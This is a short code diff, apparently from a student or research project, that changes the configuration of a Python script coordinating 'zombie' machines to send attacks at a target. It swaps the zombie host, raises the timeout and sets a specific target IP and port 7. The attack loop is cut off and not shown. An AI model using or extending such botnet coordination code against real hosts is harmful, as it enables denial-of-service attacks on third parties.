@@ -6,11 +6,11 @@ import sys
 # In a CSV, reads the CSV on attack
 
 # Each zombie registers its address and an open port to send attack to
-ZOMBIES = ["69.91.152.47"]
+ZOMBIES = ["cbou.cs.washington.edu"] #"108.179.184.63", "cbou.cs.washington.edu"]#, "cbou.cs.washington.edu"]
 PORT = 15000
-TIMEOUT = 5
-TARGET = "1000.123321.3241"
-TARGET_PORT = 80
+TIMEOUT = 30
+TARGET = "108.179.185.41"
+TARGET_PORT = 7
 
 for zombie in ZOMBIES:
     while True:
